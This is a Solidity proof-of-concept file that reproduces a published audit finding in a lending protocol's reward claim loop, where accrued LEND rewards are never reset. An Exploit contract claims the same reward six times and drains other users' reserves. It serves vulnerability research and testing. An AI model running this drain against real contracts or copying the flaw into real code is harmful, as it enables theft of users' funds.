// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Lend (Sherlock 2025-05) finding
// 58370 (H-1): "Drainage of the LEND token reserves through repeated claims of
// the same rewards".
//
// Real audited source (the vulnerable `claimLend` reward loop + `grantLendInternal`
// are reproduced VERBATIM; the vulnerable line is marked @>):
//   repo   github.com/sherlock-audit/2025-05-lend-audit-contest
//   file   Lend-V2/src/LayerZero/CoreRouter.sol
//   fn     claimLend (final grant loop, L398-407) / grantLendInternal (L416-425)
//   report github.com/sherlock-audit/2025-05-lend-audit-contest-judging/issues/148
//
// Root cause: after `grantLendInternal(holders[j], accrued)` transfers the LEND
// reward, the return value is ignored and `lendStorage.lendAccrued[holders[j]]`
// is NEVER reset (Compound resets it via
// `lendAccrued[holders[j]] = grantLendInternal(...)`). A user can therefore call
// `claimLend()` again and again, each time re-collecting the SAME accrued reward,
// draining the router's LEND reserves that belong to other users.
//
// The vulnerable loop is byte-for-byte the on-chain source. Non-vulnerable
// dependencies (LEND ERC20, LendStorage accrual mapping, Lendtroller accrual
// trigger, SafeERC20) are faithful minimal doubles with real transfers/accounting.
// ─────────────────────────────────────────────────────────────────────────────

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

/// @dev Faithful minimal SafeERC20 so `grantLendInternal` stays verbatim.
library SafeERC20 {
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        require(token.transfer(to, value), "SafeERC20: transfer failed");
    }
}

/// @dev Faithful ERC20 double for the LEND reward token held by the router.
contract LendToken is IERC20 {
    string public name = "Lend Governance Token";
    string public symbol = "LEND";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Empty market type so the verbatim `LToken[] memory lTokens` param compiles.
contract LToken {}

/// @dev Faithful double of the Lendtroller: triggers accrual (no-op here, the
///      accrual is pre-seeded in LendStorage) and exposes the LEND token address.
contract Lendtroller {
    address public lend;

    constructor(address lend_) {
        lend = lend_;
    }

    function claimLend(address) external {}

    function getLendAddress() external view returns (address) {
        return lend;
    }
}

/// @dev Faithful double of LendStorage: the `lendAccrued` mapping the router reads
///      each claim. `distribute*Lend` are the accrual hooks (no-op; accrual seeded).
contract LendStorage {
    mapping(address => uint256) public lendAccrued;

    function setAccrued(address user, uint256 amount) external {
        lendAccrued[user] = amount;
    }

    function distributeBorrowerLend(address, address) external {}

    function distributeSupplierLend(address, address) external {}
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — `claimLend`'s grant loop and `grantLendInternal` are
// reproduced VERBATIM from CoreRouter.sol.
// ─────────────────────────────────────────────────────────────────────────────
contract CoreRouter {
    using SafeERC20 for IERC20;

    Lendtroller public immutable lendtroller;
    LendStorage public immutable lendStorage;

    constructor(Lendtroller lendtroller_, LendStorage lendStorage_) {
        lendtroller = lendtroller_;
        lendStorage = lendStorage_;
    }

    /**
     * @notice Claims LEND tokens for users
     */
    function claimLend(address[] memory holders, LToken[] memory lTokens, bool borrowers, bool suppliers) external {
        lendtroller.claimLend(address(this));

        for (uint256 i = 0; i < lTokens.length;) {
            address lToken = address(lTokens[i]);

            if (borrowers) {
                for (uint256 j = 0; j < holders.length;) {
                    lendStorage.distributeBorrowerLend(lToken, holders[j]);
                    unchecked {
                        ++j;
                    }
                }
            }

            if (suppliers) {
                for (uint256 j = 0; j < holders.length;) {
                    lendStorage.distributeSupplierLend(lToken, holders[j]);
                    unchecked {
                        ++j;
                    }
                }
            }

            unchecked {
                ++i;
            }
        }

        for (uint256 j = 0; j < holders.length;) {
            uint256 accrued = lendStorage.lendAccrued(holders[j]);
            if (accrued > 0) {
                grantLendInternal(holders[j], accrued); // @> VULN: return value ignored & lendAccrued never reset -> same reward re-claimable every call
            }
            unchecked {
                ++j;
            }
        }
    }

    /**
     * @dev Grants LEND tokens to a user
     */
    function grantLendInternal(address user, uint256 amount) internal returns (uint256) {
        address lendAddress = lendtroller.getLendAddress();
        uint256 lendBalance = IERC20(lendAddress).balanceOf(address(this));

        if (amount > 0 && amount <= lendBalance) {
            IERC20(lendAddress).safeTransfer(user, amount);
            return 0;
        }
        return amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: accrue 100e18 once, then claim it 6 times to extract 600e18,
// draining 500e18 of other users' LEND reserves.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    LendToken public lend;
    Lendtroller public lendtroller;
    LendStorage public lendStorage;
    CoreRouter public vuln;

    uint256 public legitimateAccrued; // what the attacker was actually owed once
    uint256 public totalReceived; // what the vulnerable loop actually paid out
    uint256 public profit; // reserves stolen from other users
    uint256 public reserveDrained;

    uint256 internal constant ACCRUED = 100e18; // attacker's one-time legitimate reward
    uint256 internal constant OTHER_RESERVES = 1000e18; // LEND belonging to other users
    uint256 internal constant CLAIMS = 6; // 1 legitimate + 5 repeated

    constructor() {
        lend = new LendToken(); // child nonce 1 (drained/profit token)
        lendtroller = new Lendtroller(address(lend)); // child nonce 2
        lendStorage = new LendStorage(); // child nonce 3
        vuln = new CoreRouter(lendtroller, lendStorage); // child nonce 4 (VULN)

        // router holds the shared LEND reward reserve funded for all users
        lend.mint(address(vuln), OTHER_RESERVES);
    }

    function run() external {
        // attacker legitimately accrued ACCRUED exactly once
        lendStorage.setAccrued(address(this), ACCRUED);
        legitimateAccrued = ACCRUED;

        uint256 reserveBefore = lend.balanceOf(address(vuln));

        address[] memory holders = new address[](1);
        holders[0] = address(this);
        LToken[] memory noMarkets = new LToken[](0);

        // claim the SAME accrued reward CLAIMS times; lendAccrued is never reset
        for (uint256 k = 0; k < CLAIMS; k++) {
            vuln.claimLend(holders, noMarkets, false, false);
        }

        totalReceived = lend.balanceOf(address(this));
        reserveDrained = reserveBefore - lend.balanceOf(address(vuln));
        profit = totalReceived - legitimateAccrued; // stolen from other users

        // harm: attacker extracted far more than the single legitimate reward,
        // draining the shared reserve.
        require(totalReceived == ACCRUED * CLAIMS, "did not re-claim the same reward");
        require(profit == ACCRUED * (CLAIMS - 1), "no reserve drained");
        require(profit > 0, "no meaningful drain");
    }
}
